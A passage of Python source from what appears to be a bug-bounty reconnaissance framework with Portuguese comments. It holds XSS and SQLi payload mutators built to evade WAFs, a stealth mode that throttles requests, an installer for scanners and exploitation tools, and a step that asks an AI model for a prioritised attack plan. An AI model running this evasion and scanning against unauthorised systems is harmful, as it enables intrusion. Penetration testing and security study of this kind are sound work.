        if not cur_name:
            continue
        # v6 FIX: usa cur_name local ao invés de 'name' do escopo externo;
        # reconstrói todos os params preservando os que não têm '=', sem
        # dessincronizar índices entre params e rebuilt.
        rebuilt = []
        for j, q in enumerate(params):
            if j == i:
                rebuilt.append(f"{cur_name}={payload}")
            else:
                rebuilt.append(q)
        results.append(f"{base}?{'&'.join(rebuilt)}")
    return results if results else [url]

def url_encode(s: str) -> str:
    return urllib.parse.quote(s, safe='')


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD MUTATION (anti-WAF + feedback)
# ─────────────────────────────────────────────────────────────────────────────
def mutate_xss(payload: str) -> str:
    if not cfg.waf_evasion:
        return payload
    choice = random.randint(0, 5)
    if choice == 0:
        return payload
    elif choice == 1:
        p = re.sub(r'alert', 'confirm', payload, flags=re.I)
        return re.sub(r'script', 'sCrIpT', p, flags=re.I)
    elif choice == 2:
        return re.sub(r'onerror', 'onmouseover', payload, flags=re.I)
    elif choice == 3:
        out = ''
        for c in payload:
            if c.isalpha() and random.random() < 0.35:
                out += f'&#{ord(c)};'
            else:
                out += c
        return out
    elif choice == 4:
        return payload.replace('alert(', 'top["alert"](')
    else:
        return payload.replace('<script', '<sc\nript')

def mutate_sqli(payload: str) -> str:
    if not cfg.waf_evasion:
        return payload
    choice = random.randint(0, 4)
    if choice == 0:
        return payload
    elif choice == 1:
        p = re.sub(r' ', '/**/', payload)
        p = re.sub(r'SELECT', 'SeLeCt', p, flags=re.I)
        return re.sub(r'UNION', 'UniOn', p, flags=re.I)
    elif choice == 2:
        return payload.replace(' ', '+')
    elif choice == 3:
        p = re.sub(r' OR ', ' || ', payload, flags=re.I)
        return re.sub(r' AND ', ' && ', p, flags=re.I)
    else:
        p = re.sub(r'--$', '-- -', payload)
        return p.replace('1=1', '2=2')


# ─────────────────────────────────────────────────────────────────────────────
# BANNER + SETUP
# ─────────────────────────────────────────────────────────────────────────────
def banner():
    os.system('clear')
    print(f"{LCYAN}")
    print("  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗  ██╗   ██╗██████╗ ")
    print("  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║  ██║   ██║╚════██╗")
    print("  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║  ██║   ██║ █████╔╝")
    print("  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║  ╚██╗ ██╔╝ ╚═══██╗")
    print("  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║   ╚████╔╝ ██████╔╝")
    print("  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═══╝  ╚═════╝ ")
    print(f"{NC}")
    print(f"  {DIM}Full Automated Reconnaissance Framework{NC} {BOLD}v6.0{NC} {DIM}(Python){NC}")
    print(f"  {LRED}⚠  USE APENAS EM SISTEMAS COM AUTORIZAÇÃO EXPLÍCITA ⚠{NC}")
    print(f"  {DIM}v6: ToolRunner · CircuitBreaker · URL Dedup · Health Check · WAF Cache · Thread-safe Rate{NC}")
    print(f"  {DIM}─────────────────────────────────────────────────────────{NC}")
    print()

def setup_dirs():
    ts = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    cfg.scan_dir   = f"{cfg.domain}_{ts}"
    cfg.dir_root   = cfg.scan_dir
    cfg.dir_disc   = f"{cfg.scan_dir}/01_discovery"
    cfg.dir_urls   = f"{cfg.scan_dir}/02_urls"
    cfg.dir_params = f"{cfg.scan_dir}/03_params"
    cfg.dir_vulns  = f"{cfg.scan_dir}/04_vulns"
    cfg.dir_scans  = f"{cfg.scan_dir}/05_scans"
    cfg.dir_shots  = f"{cfg.scan_dir}/06_screenshots"
    cfg.dir_js     = f"{cfg.scan_dir}/07_js"
    cfg.dir_extra  = f"{cfg.scan_dir}/08_extra"
    cfg.dir_report = f"{cfg.scan_dir}/09_report"
    cfg.log_file   = f"{cfg.dir_root}/recon.log"
    cfg.error_log  = f"{cfg.dir_root}/errors.log"
    for d in [cfg.dir_disc, cfg.dir_urls, cfg.dir_params, cfg.dir_vulns,
              f"{cfg.dir_scans}/sqli_output", cfg.dir_shots, cfg.dir_js,
              cfg.dir_extra, cfg.dir_report]:
        Path(d).mkdir(parents=True, exist_ok=True)
    for f in [cfg.log_file, cfg.error_log]:
        Path(f).touch()


# ─────────────────────────────────────────────────────────────────────────────
# AUTO-INSTALL
# ─────────────────────────────────────────────────────────────────────────────
def auto_install():
    ilog = f"recon_install_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    print(f"{LCYAN}")
    print("  ╔══════════════════════════════════════════════════════════════╗")
    print("  ║       RECON v6.0 — AUTO-INSTALL DE FERRAMENTAS              ║")
    print("  ╚══════════════════════════════════════════════════════════════╝")
    print(f"{NC}")

    with open(ilog, 'w') as f:
        f.write(f"# RECON Auto-Install v3.0 — {datetime.now()}\n")

    def _ilog(m):
        with open(ilog, 'a') as _f:
            _f.write(m + '\n')

    def iok(m):  print(f"  {LGREEN}✔{NC} {m}"); _ilog(f"[OK ] {m}")
    def ierr(m): print(f"  {LRED}✘{NC} {m}");   _ilog(f"[ERR] {m}")
    def iinf(m): print(f"  {LBLUE}ℹ{NC} {m}");   _ilog(f"[INF] {m}")
    def irun(m): print(f"  {YELLOW}▶{NC} {m}");   _ilog(f"[RUN] {m}")

    def run(cmd, timeout=300):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            with open(ilog, 'a') as _f:
                _f.write((r.stdout or '')[-300:] + (r.stderr or '')[-200:])
            return r.returncode == 0
        except Exception as e:
            with open(ilog, 'a') as _f:
                _f.write(f"ERROR: {e}\n")
            return False

    pkg = None
    for mgr, chk in [('apt','apt-get'),('yum','yum'),('pacman','pacman'),('brew','brew')]:
        if shutil.which(chk):
            pkg = mgr; break
    iinf(f"Gerenciador de pacotes: {pkg or 'desconhecido'}")

    irun("Instalando dependências base...")
    if pkg == 'apt':
        run(['sudo','apt-get','update','-qq'])
        if run(['sudo','apt-get','install','-y','-qq',
                'curl','git','make','gcc','wget','unzip','python3','python3-pip',
                'exiftool','libimage-exiftool-perl']):
            iok("Deps base + exiftool (apt)")
        if run(['sudo','apt-get','install','-y','-qq','sqlmap']): iok("sqlmap (apt)")
        if run(['sudo','apt-get','install','-y','-qq','amass']): iok("amass (apt)")
        if run(['sudo','apt-get','install','-y','-qq','wafw00f']): iok("wafw00f (apt)")
    elif pkg in ('yum','pacman','brew'):
        run(['sudo', pkg if pkg != 'brew' else 'brew',
             'install' if pkg == 'brew' else ('-y' if pkg == 'yum' else '-S --noconfirm'),
             'curl','git','wget','unzip','python3','exiftool'])

    # Go
    print(); irun("Verificando Go...")
    if not shutil.which('go'):
        go_ver = "1.22.3"
        go_os  = "darwin" if platform.system() == "Darwin" else "linux"
        go_arch = "arm64" if platform.machine() in ('arm64','aarch64') else "amd64"
        go_tar = f"go{go_ver}.{go_os}-{go_arch}.tar.gz"
        irun(f"Baixando Go {go_ver}...")
        if run(['wget','--progress=bar:force',f'https://go.dev/dl/{go_tar}','-O',f'/tmp/{go_tar}'], timeout=600):
            run(['sudo','rm','-rf','/usr/local/go'])
            run(['sudo','tar','-C','/usr/local','-xzf',f'/tmp/{go_tar}'])
            os.environ['PATH'] += ':/usr/local/go/bin'
            iok(f"Go {go_ver} instalado")
        else:
            ierr("Falha no download Go")
    else:
        v = subprocess.run(['go','version'],capture_output=True,text=True).stdout.strip()
        iok(f"Go já instalado → {v}")

    gopath = os.environ.get('GOPATH', os.path.expanduser('~/go'))
    gobin  = f"{gopath}/bin"
    os.environ.update({'GOPATH': gopath, 'PATH': os.environ['PATH'] + f':{gobin}'})
    Path(gobin).mkdir(parents=True, exist_ok=True)

    def install_go(name, pkg_path):
        if shutil.which(name):
            iok(f"{name} já instalado"); return
        irun(f"go install {name}...")
        if run(['go','install',pkg_path], timeout=300):
            iok(f"{name} OK")
        else:
            ierr(f"{name} FALHOU")

    print(); iinf("══════ Ferramentas Go (obrigatórias) ══════")
    install_go("subfinder",         "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
    install_go("httpx",             "github.com/projectdiscovery/httpx/cmd/httpx@latest")
    install_go("waybackurls",       "github.com/tomnomnom/waybackurls@latest")
    install_go("gau",               "github.com/lc/gau/v2/cmd/gau@latest")
    install_go("katana",            "github.com/projectdiscovery/katana/cmd/katana@latest")
    install_go("gf",                "github.com/tomnomnom/gf@latest")
    install_go("qsreplace",         "github.com/tomnomnom/qsreplace@latest")
    install_go("dalfox",            "github.com/hahwul/dalfox/v2@latest")
    install_go("nuclei",            "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
    install_go("interactsh-client", "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")

    print(); iinf("══════ Ferramentas Go (opcionais) ══════")
    install_go("gowitness",   "github.com/sensepost/gowitness@latest")
    install_go("naabu",       "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest")
    install_go("subzy",       "github.com/PentestPad/subzy@latest")
    install_go("ffuf",        "github.com/ffuf/ffuf/v2@latest")
    install_go("assetfinder", "github.com/tomnomnom/assetfinder@latest")
    install_go("findomain",   "github.com/findomain/findomain@latest")

    print(); iinf("══════ Ferramentas Python (pip) ══════")
    for pkg_n in ['uro','arjun','wafw00f','ghauri','trufflehog']:
        if shutil.which(pkg_n):
            iok(f"{pkg_n} já instalado"); continue
        irun(f"pip install {pkg_n}...")
        if run([sys.executable,'-m','pip','install',pkg_n,'--break-system-packages','-q']):
            iok(f"{pkg_n} OK")
        else:
            ierr(f"{pkg_n} pip falhou")

    # GF Patterns (inclui debug-pages, upload, aws-keys, cors — v3)
    print(); iinf("══════ GF Patterns (completo v3) ══════")
    gf_dir = os.path.expanduser("~/.gf")
    Path(gf_dir).mkdir(exist_ok=True)
    for repo, name in [
        ("https://github.com/1ndianl33t/Gf-Patterns", "1ndianl33t"),
        ("https://github.com/dwisiswant0/gf-secrets", "gf-secrets"),
        ("https://github.com/NitinYadav00/GF-Patterns", "NitinYadav"),
    ]:
        tmp = tempfile.mkdtemp()
        irun(f"Clonando {name}...")
        if run(['git','clone','-q', repo, tmp]):
            for jf in glob.glob(f"{tmp}/*.json"):
                dest = os.path.join(gf_dir, os.path.basename(jf))
                if not os.path.exists(dest):
                    shutil.copy(jf, gf_dir)
            iok(f"{name}: padrões instalados")
        else:
            ierr(f"{name}: falhou ao clonar")
        shutil.rmtree(tmp, ignore_errors=True)

    # Patterns extras (inline JSON) para os que faltam no log
    _install_extra_gf_patterns(gf_dir, iok)

    # Nuclei templates
    print(); iinf("══════ Nuclei Templates ══════")
    if shutil.which('nuclei'):
        irun("Atualizando nuclei templates...")
        if run(['nuclei','-update-templates','-silent']): iok("Templates atualizados")
        else: ierr("nuclei update falhou")

    # SecLists
    print(); iinf("══════ WordLists (SecLists) ══════")
    if not os.path.isdir('/usr/share/seclists'):
        if pkg == 'apt':
            if run(['sudo','apt-get','install','-y','-qq','seclists']): iok("SecLists (apt)")
            else:
                irun("Clonando via git...")
                run(['git','clone','-q','--depth','1',
                     'https://github.com/danielmiessler/SecLists','/usr/share/seclists'], timeout=600)
        else:
            irun("Clonando SecLists...")
            run(['git','clone','-q','--depth','1',
                 'https://github.com/danielmiessler/SecLists','/usr/share/seclists'], timeout=600)
    else:
        iok("SecLists já presente")

    # Summary
    print()
    all_tools = ['subfinder','httpx','waybackurls','gau','katana','gf','qsreplace','dalfox',
                 'nuclei','gowitness','naabu','subzy','ffuf','assetfinder','sqlmap',
                 'uro','arjun','wafw00f','ghauri','trufflehog','exiftool']
    ok_n = sum(1 for t in all_tools if shutil.which(t))
    for t in all_tools:
        sym = f"{LGREEN}✔{NC}" if shutil.which(t) else f"{LRED}✘{NC}"
        print(f"  {sym} {t} → {shutil.which(t) or 'não encontrado'}")
    print(f"\n  {BOLD}Instalados:{NC} {LGREEN}{ok_n}{NC}/{len(all_tools)}")
    print(f"  {BOLD}Log:{NC} {CYAN}{ilog}{NC}")

    # v4: Health check — valida ferramenta com execução real
    print(f"\n  {BOLD}{LBLUE}══ Health Check pós-install ══{NC}")
    health_cmds = {
        'subfinder':  ['subfinder', '-version'],
        'httpx':      ['httpx', '-version'],
        'dalfox':     ['dalfox', 'version'],
        'nuclei':     ['nuclei', '-version'],
        'sqlmap':     ['sqlmap', '--version'],
        'gf':         ['gf', '-list'],
        'katana':     ['katana', '-version'],
        'waybackurls':['waybackurls', '-h'],
    }
    critical_fail = []
    for tool, cmd in health_cmds.items():
        if not shutil.which(tool):
            ierr(f"Health: {tool} — binário ausente"); critical_fail.append(tool); continue
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if r.returncode in (0, 1, 2):  # algumas ferramentas retornam 1 em -h
                iok(f"Health: {tool} OK")
            else:
                ierr(f"Health: {tool} — exit={r.returncode}"); critical_fail.append(tool)
        except Exception as e:
            ierr(f"Health: {tool} — erro: {e}"); critical_fail.append(tool)

    if critical_fail:
        print(f"\n  {LRED}⚠ Ferramentas com falha no health check: {', '.join(critical_fail)}{NC}")
        print(f"  {YELLOW}  → Corrija manualmente antes de rodar um scan.{NC}")
    else:
        print(f"\n  {LGREEN}✔ Health check OK — todas as ferramentas respondem corretamente.{NC}")
    sys.exit(0)

def _install_extra_gf_patterns(gf_dir: str, iok):
    """Instala padrões GF que costumam faltar (debug-pages, upload, aws-keys, cors)."""
    patterns = {
        "debug-pages": {
            "flags": "-iE",
            "patterns": ["debug","phpdebug","phpinfo","test\\.php","info\\.php","config\\.php","env","application\\.properties"]
        },
        "upload": {
            "flags": "-iE",
            "patterns": ["upload","file=","filename=","attachment","multipart","enctype"]
        },
        "aws-keys": {
            "flags": "-E",
            "patterns": ["AKIA[0-9A-Z]{16}","ASIA[0-9A-Z]{16}","aws_access_key","aws_secret","s3\\.amazonaws\\.com"]
        },
        "cors": {
            "flags": "-iE",
            "patterns": ["Access-Control-Allow-Origin","cors","crossorigin","origin=","callback=","jsonp"]
        },
    }
    for name, content in patterns.items():
        dest = os.path.join(gf_dir, f"{name}.json")
        if not os.path.exists(dest):
            with open(dest, 'w') as f:
                json.dump(content, f)
            iok(f"gf pattern '{name}' instalado")


# ─────────────────────────────────────────────────────────────────────────────
# v6 — HEALTH CHECK INICIAL (valida pré-condições antes do scan pesado)
# ─────────────────────────────────────────────────────────────────────────────
def step_initial_health_check():
    """
    Verifica pré-condições críticas antes de iniciar qualquer scan:
    - Binários essenciais no PATH
    - Permissão de escrita no SQLite
    - Acessibilidade da API Anthropic (se configurada)
    - Existência da wordlist configurada
    Falha com sys.exit(3) se algo crítico estiver quebrado.
    """
    section("00 / HEALTH CHECK INICIAL")
    critical_ok = True

    # ── Binários essenciais do sistema ────────────────────────────────────────
    system_tools = {'curl': True, 'git': False, 'python3': True}
    for tool, is_critical in system_tools.items():
        if shutil.which(tool):
            success(f"  {tool}: OK → {shutil.which(tool)}")
        elif is_critical:
            error(f"  {tool}: NÃO ENCONTRADO — CRÍTICO")
            critical_ok = False
        else:
            warn(f"  {tool}: não encontrado (opcional)")

    # ── Permissão de escrita na pasta de trabalho ─────────────────────────────
    try:
        test_file = os.path.join(os.getcwd(), '.recon_write_test')
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        success("  Escrita na pasta atual: OK")
    except OSError as e:
        error(f"  Escrita na pasta atual: FALHOU — {e}")
        critical_ok = False

    # ── SQLite write test ─────────────────────────────────────────────────────
    if cfg.sqlite_db:
        test_db = cfg.sqlite_db + '._test'
        try:
            con = sqlite3.connect(test_db, timeout=5)
            con.execute("CREATE TABLE IF NOT EXISTS _test (x INTEGER)")
            con.commit()
            con.close()
            os.remove(test_db)
            success(f"  SQLite: escrita OK → {cfg.sqlite_db}")
        except (sqlite3.OperationalError, OSError) as e:
            error(f"  SQLite: sem permissão de escrita — {e}")
            critical_ok = False

    # ── Anthropic API ─────────────────────────────────────────────────────────
    if cfg.anthropic_api_key:
        try:
            req = urllib.request.Request(
                "https://api.anthropic.com/v1/models",
                headers={"x-api-key": cfg.anthropic_api_key,
                         "anthropic-version": "2023-06-01",
                         "User-Agent": random_ua()}
            )
            urllib.request.urlopen(req, timeout=10)
            success("  Anthropic API: acessível e chave válida")
        except urllib.error.HTTPError as e:
            if e.code == 401:
                error("  Anthropic API: chave inválida (401) — funções de IA desabilitadas")
                cfg.anthropic_api_key = ""   # desabilita para evitar falhas posteriores
            elif e.code in (429, 529):
                warn(f"  Anthropic API: quota/sobrecarga ({e.code}) — IA pode ser lenta")
            else:
                warn(f"  Anthropic API: HTTP {e.code} — verifique manualmente")
        except urllib.error.URLError as e:
            warn(f"  Anthropic API: sem acesso de rede — {e.reason}")
        except OSError as e:
            warn(f"  Anthropic API: erro de OS — {e}")

    # ── Wordlist configurada ──────────────────────────────────────────────────
    if cfg.wordlist_path:
        if os.path.exists(cfg.wordlist_path):
            size_kb = os.path.getsize(cfg.wordlist_path) // 1024
            success(f"  Wordlist: OK → {cfg.wordlist_path} ({size_kb} KB)")
        else:
            warn(f"  Wordlist RECON_WORDLIST não encontrada: {cfg.wordlist_path}")
            cfg.wordlist_path = ""  # zera para o fallback do step_ffuf funcionar

    # ── webhook URL (ping simples) ────────────────────────────────────────────
    if cfg.webhook_url:
        try:
            ping = json.dumps({"text": f"[RECON v6] Health check iniciado para {cfg.domain}"}).encode()
            req2 = urllib.request.Request(cfg.webhook_url, data=ping,
                                          headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req2, timeout=5)
            success("  Webhook: OK")
        except Exception:
            warn("  Webhook: não acessível ou URL inválida — alertas desabilitados")
            cfg.webhook_url = ""

    print()
    if not critical_ok:
        error("Health check inicial falhou em itens CRÍTICOS — corrija antes de prosseguir.")
        sys.exit(3)
    else:
        success("Health check inicial: todos os itens críticos OK ✔")


# ─────────────────────────────────────────────────────────────────────────────
# CHECK DEPS + AUTO-INSTALL GF PATTERNS FALTANTES
# ─────────────────────────────────────────────────────────────────────────────
def check_deps():
    section("VERIFICANDO DEPENDÊNCIAS")
    gopath = os.environ.get('GOPATH', os.path.expanduser('~/go'))
    os.environ['PATH'] = os.environ['PATH'] + f":{gopath}/bin:/usr/local/go/bin"

    required = ['subfinder','httpx','waybackurls','gau','katana','gf','uro','qsreplace',
                 'dalfox','nuclei','sqlmap']
    optional = ['gowitness','naabu','subzy','arjun','ffuf','trufflehog','assetfinder',
                 'amass','findomain','ghauri','wafw00f','interactsh-client','exiftool']
    missing = []
    for t in required:
        if shutil.which(t): success(f"{t} → {shutil.which(t)}")
        else: error(f"{t} → NÃO ENCONTRADO"); missing.append(t)
    print()
    for t in optional:
        if shutil.which(t): info(f"{t} (opcional) → {shutil.which(t)}")
        else: warn(f"{t} (opcional) → não encontrado")
    if missing:
        error(f"Obrigatórias ausentes: {' '.join(missing)}")
        warn("  → Use 'python3 recon.py --install' para instalar tudo")
        sys.exit(1)

    cfg.has_gowitness  = bool(shutil.which('gowitness'))
    cfg.has_naabu      = bool(shutil.which('naabu'))
    cfg.has_subzy      = bool(shutil.which('subzy'))
    cfg.has_arjun      = bool(shutil.which('arjun'))
    cfg.has_ffuf       = bool(shutil.which('ffuf'))
    cfg.has_trufflehog = bool(shutil.which('trufflehog'))
    cfg.has_assetfinder= bool(shutil.which('assetfinder'))
    cfg.has_amass      = bool(shutil.which('amass'))
    cfg.has_findomain  = bool(shutil.which('findomain'))
    cfg.has_ghauri     = bool(shutil.which('ghauri'))
    cfg.has_wafw00f    = bool(shutil.which('wafw00f'))
    cfg.has_interactsh = bool(shutil.which('interactsh-client'))
    cfg.has_exiftool   = bool(shutil.which('exiftool'))
    cfg.has_gpg        = bool(shutil.which('gpg'))

    # Auto-instala padrões GF faltantes
    gf_dir = os.path.expanduser("~/.gf")
    Path(gf_dir).mkdir(exist_ok=True)
    _install_extra_gf_patterns(gf_dir, lambda m: info(f"GF pattern: {m}"))

    success("Todas as dependências obrigatórias OK")


# ─────────────────────────────────────────────────────────────────────────────
# TECHNOLOGY PROFILER (v3 — NOVO)
# ─────────────────────────────────────────────────────────────────────────────
def step_tech_profiler():
    section("00a / TECHNOLOGY PROFILER")
    tech_file = f"{cfg.dir_extra}/technologies.txt"
    Path(tech_file).touch()
    alive = safe_read(f"{cfg.dir_disc}/alive.txt")
    if not alive:
        warn("Nenhum host ativo para profile"); return

    targets = alive[:min(len(alive), 20)]
    log(f"Analisando stack tecnológica em {len(targets)} hosts...")

    tech_signatures = {
        'PHP':        [r'X-Powered-By: PHP', r'\.php', r'PHPSESSID'],
        'Node.js':    [r'X-Powered-By: Express', r'x-powered-by: node', r'\.js\?v='],
        'Java':       [r'X-Powered-By: Servlet', r'jsessionid', r'\.jsp', r'struts'],
        'ASP.NET':    [r'X-Powered-By: ASP\.NET', r'ASP\.NET_SessionId', r'\.aspx'],
        'Python':     [r'X-Powered-By: Python', r'django', r'flask', r'wsgi'],
        'Ruby':       [r'X-Runtime:', r'Phusion Passenger', r'ruby'],
        'WordPress':  [r'wp-content', r'wp-includes', r'wp-json', r'wordpress'],
        'Apache':     [r'Server: Apache', r'mod_'],
        'Nginx':      [r'Server: nginx'],
        'IIS':        [r'Server: Microsoft-IIS', r'Server: IIS'],
        'GraphQL':    [r'graphql', r'__schema', r'/graphiql'],
        'AWS':        [r'x-amz-', r'\.s3\.amazonaws\.com', r'cloudfront'],
        'Cloudflare': [r'cf-ray:', r'cf-cache-status:', r'cloudflare'],
    }

    detected = set()

    def profile_host(url):
        status, body = cfetch(url)
        _, hdrs = cfetch_headers(url)
        combined = (body + '\n' + hdrs).lower()
        found = []
        for tech, sigs in tech_signatures.items():
            for sig in sigs:
                if re.search(sig, combined, re.I):
                    found.append(tech)
                    break
        return url, found

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        results = list(ex.map(profile_host, targets))

    with open(tech_file, 'w') as f:
        for url, techs in results:
            if techs:
                line = f"{url}: {', '.join(techs)}"
                f.write(line + '\n')
                for t in techs:
                    detected.add(t)

    # Update config flags
    cfg.tech_php       = 'PHP' in detected
    cfg.tech_nodejs    = 'Node.js' in detected
    cfg.tech_java      = 'Java' in detected
    cfg.tech_dotnet    = 'ASP.NET' in detected
    cfg.tech_python    = 'Python' in detected
    cfg.tech_ruby      = 'Ruby' in detected
    cfg.tech_apache    = 'Apache' in detected
    cfg.tech_nginx     = 'Nginx' in detected
    cfg.tech_iis       = 'IIS' in detected
    cfg.tech_wordpress = 'WordPress' in detected
    cfg.tech_graphql   = 'GraphQL' in detected
    cfg.tech_aws       = 'AWS' in detected

    if detected:
        success(f"Tecnologias detectadas: {', '.join(sorted(detected))}")
        # Adaptar scan baseado no stack
        if cfg.tech_php:
            info("→ PHP detectado: priorizando LFI/RFI, desserialização PHP, include()")
        if cfg.tech_wordpress:
            info("→ WordPress detectado: nuclei templates wp-* serão priorizados")
        if cfg.tech_java:
            info("→ Java detectado: priorizando desserialização, SSTI Freemarker/Velocity")
        if cfg.tech_graphql:
            info("→ GraphQL detectado: introspection e DoS queries priorizados")
        if cfg.tech_aws:
            info("→ AWS detectado: enumeração S3, metadata SSRF priorizados")
    else:
        warn("Nenhuma tecnologia identificada pelos headers/body")


# ─────────────────────────────────────────────────────────────────────────────
# AI ATTACK PLANNER (v3 — NOVO)
# ─────────────────────────────────────────────────────────────────────────────
def step_ai_planner():
    section("00c / AI ATTACK PLANNER")
    if not cfg.anthropic_api_key:
        warn("AI Planner requer --api-key. Pulando..."); return

    # Coleta dados iniciais (antes dos scans ativos)
    alive_hosts = safe_read(f"{cfg.dir_disc}/alive.txt")
    techs = safe_read(f"{cfg.dir_extra}/technologies.txt")
    subs  = safe_read(f"{cfg.dir_disc}/subs_all.txt")
    waf   = safe_read(f"{cfg.dir_extra}/waf_detected.txt")
    gf_counts = {}
    for pat in ['xss','sqli','lfi','rce','ssrf','redirect','ssti','idor']:
        gf_counts[pat] = count_lines(f"{cfg.dir_vulns}/{pat}.txt")

    context = f"""Domínio alvo: {cfg.domain}
Hosts ativos ({len(alive_hosts)}): {chr(10).join(alive_hosts[:15])}
Subdomínios totais: {len(subs)}
Tecnologias detectadas:
{chr(10).join(techs[:20])}
WAF: {chr(10).join(waf[:5]) if waf else 'Não detectado'}
GF candidates: {json.dumps(gf_counts, indent=2)}
Portas abertas: {safe_read(cfg.dir_disc+'/ports_interesting.txt')[:10]}
Arquivos admin/API detectados: {count_lines(cfg.dir_urls+'/urls_admin.txt')} admin, {count_lines(cfg.dir_urls+'/urls_api.txt')} API
"""

    log("Consultando AI para planejamento de ataque...")
    payload = {
        "model": "claude-sonnet-4-20250514",
        "max_tokens": 1500,
        "system": (
            "Você é um especialista em bug bounty e pentest. "
            "Com base nos dados de reconhecimento fornecidos, produza um PLANO DE ATAQUE PRIORITIZADO:\n"
            "1. TOP 3 vetores de ataque mais promissores com justificativa técnica\n"
            "2. Para cada vetor: ferramentas específicas e flags recomendadas\n"
            "3. Módulos que podem ser pulados (sem candidatos relevantes)\n"
            "4. Alertas de segurança específicos para as tecnologias detectadas\n"
            "Seja direto e técnico. Responda em português."
        ),
        "messages": [{"role": "user", "content": context}]
    }
    try:
        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages",
            data=json.dumps(payload).encode(),
            headers={
                "Content-Type": "application/json",
                "x-api-key": cfg.anthropic_api_key,
                "anthropic-version": "2023-06-01"
            }
        )
        with urllib.request.urlopen(req, timeout=60) as resp:
            data = json.loads(resp.read())
            plan_text = data["content"][0]["text"]

        plan_file = f"{cfg.dir_report}/ai_attack_plan.txt"
        with open(plan_file, 'w') as f:
            f.write(plan_text)
        success(f"AI Attack Plan → {plan_file}")
        print()
        print(f"{BOLD}{LCYAN}══════ AI ATTACK PLAN ══════{NC}")
        print(plan_text)
        print(f"{BOLD}{LCYAN}════════════════════════════{NC}")
        print()
    except Exception as e:
        warn(f"AI Planner falhou: {e}")


# ─────────────────────────────────────────────────────────────────────────────
# ADAPT TO WAF (melhorado — parse wafw00f sem ANSI)
# ─────────────────────────────────────────────────────────────────────────────
def adapt_to_waf():
    if not cfg.adaptive_mode or not cfg.waf_detected:
        return
    waf_path = f"{cfg.dir_extra}/waf_detected.txt"
    waf_type = ""
    if os.path.exists(waf_path):
        # v6 FIX: usa 'with' + trata OSError — evita handle aberto e crash em arquivo corrompido
        try:
            with open(waf_path) as _wf:
                content = strip_ansi(_wf.read()).lower()
        except OSError as e:
            log_err(f"adapt_to_waf: não foi possível ler {waf_path} — {e}")
            content = ""
        for wt in ['cloudflare','akamai','imperva','modsecurity','fortinet','f5',
                   'sucuri','barracuda','awsalb','fastly','incapsula']:
            if wt in content:
                waf_type = wt; break
    warn(f"🧠 Inteligência Adaptativa ativada — WAF: {waf_type or 'unknown'}")
    cfg.jitter_mode = True
    if waf_type in ('cloudflare','akamai','imperva','incapsula'):
        cfg.curl_delay = 2; cfg.burst_pause = 5; cfg.max_dalfox_workers = 5
        cfg.scan_profile = "stealth"; cfg.xss_url_deadline = 30
    elif waf_type in ('modsecurity','fortinet','f5','barracuda'):
        cfg.curl_delay = 1; cfg.burst_pause = 3; cfg.max_dalfox_workers = 10
        cfg.scan_profile = "stealth"; cfg.xss_url_deadline = 40
    else:
        cfg.curl_delay = 1; cfg.burst_pause = 2; cfg.scan_profile = "stealth"
    for attr, limit in [('limit_cors',20),('limit_headers',15),('limit_sensitive',10),
                         ('limit_lfi',15),('limit_redirect',15),('limit_idor',15),
                         ('limit_crlf',15),('max_sqli',15),('limit_xss_manual',25)]:
        if getattr(cfg, attr) > limit:
            setattr(cfg, attr, limit)
    cfg.waf_evasion = True
    info(f"Perfil adaptado → stealth: delay={cfg.curl_delay}s burst={cfg.burst_pause}s xss_deadline={cfg.xss_url_deadline}s")
    with open(waf_path, 'a') as f:
        f.write(f"\n[ADAPTIVE v3] WAF={waf_type} profile=stealth\n")


# ─────────────────────────────────────────────────────────────────────────────
# ENDPOINT SCORING
# ─────────────────────────────────────────────────────────────────────────────
def score_endpoint(url: str) -> int:
    score = 0
    if re.search(r'[?&](id|user_id|uid|account|admin|token|key|secret|pass|auth|session|debug|cmd|exec|file|path|redirect|url|next|to|src|dest|data|load|include|require|page|template)=', url, re.I):
        score += 30
    if re.search(r'/(admin|dashboard|panel|manager|backend|cms|phpmyadmin|wp-admin|cpanel|portal|internal|staff|console)', url, re.I):
        score += 25
    if re.search(r'/(api|graphql|v[0-9]+|rest|rpc|soap|service)', url, re.I):
        score += 20
    if re.search(r'\.(php|asp|aspx|jsp|cfm|cgi|pl)(\?|$)', url, re.I):
        score += 15
    score += len(re.findall(r'[?&][^=&]+=', url)) * 5
    if re.search(r'(login|auth|signup|register|password|reset|pay|billing|checkout|invoice|order|user|account|profile|settings|config|upload|download|export|import|report|search|query)', url, re.I):
        score += 10
    if re.search(r'(upload|file|attach|document|image|pdf|import|export)', url, re.I):
        score += 15
    return score

def prioritize_targets(infile: str, outfile: str):
    if not os.path.exists(infile):
        Path(outfile).touch(); return
    if not cfg.endpoint_scoring:
        shutil.copy(infile, outfile); return
    urls = safe_read(infile)
    scored = sorted(urls, key=lambda u: score_endpoint(u), reverse=True)
    if cfg.noise_reduction:
        chunk_size = 10
        chunks = [scored[i:i+chunk_size] for i in range(0, len(scored), chunk_size)]
        result = []
        for chunk in chunks:
            random.shuffle(chunk)
            result.extend(chunk)
        scored = result
    with open(outfile, 'w') as f:
        f.write('\n'.join(scored) + '\n')
    info(f"Scoring: {len(scored)} endpoints priorizados por risco")


# ─────────────────────────────────────────────────────────────────────────────
# PASSIVE INTEL
# ─────────────────────────────────────────────────────────────────────────────
def step_passive_intel():
    if not cfg.passive_intel:
        return
    section("00b / PASSIVE INTEL (cert transparency, ASN, BGP)")
